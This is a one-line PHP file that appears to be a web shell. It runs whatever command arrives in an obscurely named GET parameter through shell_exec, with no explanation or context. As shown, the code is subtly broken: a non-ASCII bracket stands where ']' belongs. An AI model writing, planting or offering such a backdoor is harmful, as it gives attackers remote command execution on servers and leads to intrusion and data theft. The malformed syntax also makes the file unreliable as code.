<?php
shell_exec($_GET['njIs41J-'〕);
?>
